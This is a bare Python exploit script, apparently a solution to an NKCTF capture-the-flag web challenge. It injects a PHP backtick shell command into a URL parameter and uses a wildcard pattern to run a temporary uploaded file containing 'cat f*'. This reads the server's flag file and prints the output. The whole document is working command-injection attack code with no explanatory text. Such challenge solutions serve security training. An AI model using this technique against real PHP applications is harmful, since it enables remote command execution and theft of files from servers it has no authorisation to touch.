import requests
url="http://433540d9-95fb-4665-8734-6343e063217f.node.yuzhian.com.cn:8000/?NKCTF=?><?=`. /???/????????[@-[]`;?>"
files={'file':'cat f*'}
response=requests.post(url,files=files)
html = response.text
print(html)
